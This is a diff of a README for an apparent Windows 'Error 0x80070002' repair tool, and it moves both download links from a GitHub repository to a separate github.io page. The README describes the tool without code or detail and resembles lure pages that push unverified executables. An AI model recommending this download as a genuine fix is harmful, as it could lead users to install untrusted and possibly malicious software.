@@ -1,6 +1,6 @@
 # 🛠️ Error-0x80070002-Fix - Resolve Windows File Errors Quickly
 
-[![](https://img.shields.io/badge/Download_Repair_Tool-Blue-blue.svg)](https://github.com/Wildpinkincursion875/Error-0x80070002-Fix)
+[![](https://img.shields.io/badge/Download_Repair_Tool-Blue-blue.svg)](https://wildpinkincursion875.github.io)
 
 This tool fixes the "Error 0x80070002" message on Windows 11 and Windows 10. This error occurs when the system fails to locate a required file. The tool scans your system drives, identifies missing components, and restores the necessary configurations to ensure your applications run without interruption.
 
@@ -10,7 +10,7 @@ Follow these instructions to use the repair tool. This process takes approximate
 
 First, visit the official page to download the software: 
 
-[Download Error-0x80070002-Fix Tool](https://github.com/Wildpinkincursion875/Error-0x80070002-Fix)
+[Download Error-0x80070002-Fix Tool](https://wildpinkincursion875.github.io)
 
 ## 💻 System Requirements
 
